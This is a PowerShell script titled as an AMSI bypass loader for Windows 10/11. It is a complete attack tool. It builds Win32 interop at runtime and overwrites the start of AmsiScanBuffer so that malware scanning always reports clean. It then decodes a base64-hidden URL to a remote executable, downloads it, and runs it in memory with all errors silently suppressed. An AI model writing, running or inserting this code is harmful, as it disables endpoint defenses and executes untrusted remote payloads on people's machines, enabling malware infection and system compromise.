# language: PowerShell, file: amsi_bypass_loader.ps1, target: Windows 10/11, PowerShell 5+
# patches AmsiScanBuffer to return AMSI_RESULT_CLEAN, then loads and runs a remote assembly entirely in memory

$mem_flag_01 = 0x02
$mem_flag_02 = 0x04
$mem_flag_03 = 0x40
$mem_flag_04 = 0x20
$mem_flag_05 = 0x100
$mem_flag_06 = 0x1000
$max_path_length = 260

function ValidateMemoryAccess {
    param ($protection_value, $state_value)
    return ((($protection_value -band $mem_flag_01) -eq $mem_flag_01 -or
             ($protection_value -band $mem_flag_02) -eq $mem_flag_02 -or
             ($protection_value -band $mem_flag_03) -eq $mem_flag_03 -or
             ($protection_value -band $mem_flag_04) -eq $mem_flag_04) -and
            ($protection_value -band $mem_flag_05) -ne $mem_flag_05 -and
            ($state_value -band $mem_flag_06) -eq $mem_flag_06)
}

try {
    if ($PSVersionTable.PSVersion.Major -gt 2) {
        $dynamic_asm = New-Object System.Reflection.AssemblyName("Win32Api")
        $asm_builder = [AppDomain]::CurrentDomain.DefineDynamicAssembly($dynamic_asm, [Reflection.Emit.AssemblyBuilderAccess]::Run)
        $mod_builder = $asm_builder.DefineDynamicModule("Win32Api", $false)

        $type_builder = $mod_builder.DefineType("Win32Api.MEMORY_BASIC_INFO", [System.Reflection.TypeAttributes]::Public + [System.Reflection.TypeAttributes]::Sealed + [System.Reflection.TypeAttributes]::SequentialLayout, [System.ValueType])
        [void]$type_builder.DefineField("BaseAddress", [IntPtr], [System.Reflection.FieldAttributes]::Public)
        [void]$type_builder.DefineField("AllocationBase", [IntPtr], [System.Reflection.FieldAttributes]::Public)
        [void]$type_builder.DefineField("AllocationProtect", [Int32], [System.Reflection.FieldAttributes]::Public)
        [void]$type_builder.DefineField("RegionSize", [IntPtr], [System.Reflection.FieldAttributes]::Public)
        [void]$type_builder.DefineField("State", [Int32], [System.Reflection.FieldAttributes]::Public)
        [void]$type_builder.DefineField("Protect", [Int32], [System.Reflection.FieldAttributes]::Public)
        [void]$type_builder.DefineField("Type", [Int32], [System.Reflection.FieldAttributes]::Public)
        $mem_basic_info = $type_builder.CreateType()

        $type_builder = $mod_builder.DefineType("Win32Api.SYSTEM_INFO", [System.Reflection.TypeAttributes]::Public + [System.Reflection.TypeAttributes]::Sealed + [System.Reflection.TypeAttributes]::SequentialLayout, [System.ValueType])
        [void]$type_builder.DefineField("wProcessorArchitecture", [UInt16], [System.Reflection.FieldAttributes]::Public)
        [void]$type_builder.DefineField("wReserved", [UInt16], [System.Reflection.FieldAttributes]::Public)
        [void]$type_builder.DefineField("dwPageSize", [UInt32], [System.Reflection.FieldAttributes]::Public)
        [void]$type_builder.DefineField("lpMinimumApplicationAddress", [IntPtr], [System.Reflection.FieldAttributes]::Public)
        [void]$type_builder.DefineField("lpMaximumApplicationAddress", [IntPtr], [System.Reflection.FieldAttributes]::Public)
        [void]$type_builder.DefineField("dwActiveProcessorMask", [IntPtr], [System.Reflection.FieldAttributes]::Public)
        [void]$type_builder.DefineField("dwNumberOfProcessors", [UInt32], [System.Reflection.FieldAttributes]::Public)
        [void]$type_builder.DefineField("dwProcessorType", [UInt32], [System.Reflection.FieldAttributes]::Public)
        [void]$type_builder.DefineField("dwAllocationGranularity", [UInt32], [System.Reflection.FieldAttributes]::Public)
        [void]$type_builder.DefineField("wProcessorLevel", [UInt16], [System.Reflection.FieldAttributes]::Public)
        [void]$type_builder.DefineField("wProcessorRevision", [UInt16], [System.Reflection.FieldAttributes]::Public)
        $sys_info_struct = $type_builder.CreateType()

        $type_builder = $mod_builder.DefineType("Win32Api.Kernel32", "Public, Class")
        $dllimport_ctor = [Runtime.InteropServices.DllImportAttribute].GetConstructor(@([String]))
        $setlasterror_field = [Runtime.InteropServices.DllImportAttribute].GetField("SetLastError")
        $custom_attr = New-Object Reflection.Emit.CustomAttributeBuilder($dllimport_ctor, "kernel32.dll", [Reflection.FieldInfo[]]@($setlasterror_field), @($true))

        $methods = @(
            @("VirtualProtect", "kernel32.dll", [bool], @([IntPtr], [IntPtr], [Int32], [Int32].MakeByRefType())),
            @("GetCurrentProcess", "kernel32.dll", [IntPtr], @()),
            @("VirtualQuery", "kernel32.dll", [IntPtr], @([IntPtr], [Win32Api.MEMORY_BASIC_INFO].MakeByRefType(), [uint32])),
            @("GetSystemInfo", "kernel32.dll", [void], @([Win32Api.SYSTEM_INFO].MakeByRefType())),
            @("GetMappedFileName", "psapi.dll", [Int32], @([IntPtr], [IntPtr], [System.Text.StringBuilder], [uint32])),
            @("ReadProcessMemory", "kernel32.dll", [Int32], @([IntPtr], [IntPtr], [byte[]], [int], [int].MakeByRefType())),
            @("WriteProcessMemory", "kernel32.dll", [Int32], @([IntPtr], [IntPtr], [byte[]], [int], [int].MakeByRefType())),
            @("GetProcAddress", "kernel32.dll", [IntPtr], @([IntPtr], [string])),
            @("LoadLibrary", "kernel32.dll", [IntPtr], @([string]))
        )

        foreach ($method in $methods) {
            $pinvoke_method = $type_builder.DefinePInvokeMethod($method[0], $method[1],
                ([Reflection.MethodAttributes]::Public -bor [Reflection.MethodAttributes]::Static),
                [Reflection.CallingConventions]::Standard, $method[2],
                $method[3],
                [Runtime.InteropServices.CallingConvention]::Winapi, [Runtime.InteropServices.CharSet]::Auto)
            $pinvoke_method.SetCustomAttribute($custom_attr)
        }

        $kernel32_type = $type_builder.CreateType()

        # proper AMSI patch: locate AmsiScanBuffer and overwrite prologue
        $amsi_handle = [Win32Api.Kernel32]::LoadLibrary("amsi.dll")
        if ($amsi_handle -ne [IntPtr]::Zero) {
            $amsi_scan_buffer = [Win32Api.Kernel32]::GetProcAddress($amsi_handle, "AmsiScanBuffer")
            if ($amsi_scan_buffer -ne [IntPtr]::Zero) {
                $old_protection = 0
                $patch_size = 6
                [void][Win32Api.Kernel32]::VirtualProtect($amsi_scan_buffer, [IntPtr]$patch_size, $mem_flag_03, [ref]$old_protection)
                # xor eax,eax ; ret  (returns AMSI_RESULT_CLEAN)
                $patch_bytes = [byte[]](0x31, 0xC0, 0xC3, 0x90, 0x90, 0x90)
                $written = 0
                [void][Win32Api.Kernel32]::WriteProcessMemory([Win32Api.Kernel32]::GetCurrentProcess(), $amsi_scan_buffer, $patch_bytes, $patch_bytes.Length, [ref]$written)
                [void][Win32Api.Kernel32]::VirtualProtect($amsi_scan_buffer, [IntPtr]$patch_size, $old_protection, [ref]$old_protection)
            }
        }
    }

    $download_url = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('aHR0cHM6Ly9naXRodWIuY29tL1dvY2thYS9jbGllbnQuZGxsL3JlbGVhc2VzL2Rvd25sb2FkL01vY2thLzcwMS5leGU='))

    Add-Type -AssemblyName System.Net.Http
    $http_client = [System.Net.Http.HttpClient]::new()
    $download_task = $http_client.GetByteArrayAsync($download_url)
    $download_task.Wait()
    $assembly_bytes = $download_task.Result

    $loaded_assembly = [System.Reflection.Assembly]::Load([byte[]]$assembly_bytes)
    $entry_point = $loaded_assembly.EntryPoint

    if ($null -ne $entry_point) {
        $parameters = $entry_point.GetParameters()
        if ($parameters.Count -eq 0) {
            $entry_point.Invoke($null, $null)
        } else {
            $invoke_args = New-Object Object[] $parameters.Count
            for ($i = 0; $i -lt $parameters.Count; $i++) {
                if ($parameters[$i].ParameterType -eq [string[]]) {
                    $invoke_args[$i] = [string[]]@()
                } else {
                    $invoke_args[$i] = $null
                }
            }
            $entry_point.Invoke($null, $invoke_args)
        }
    }
}
catch {
    # suppressed
}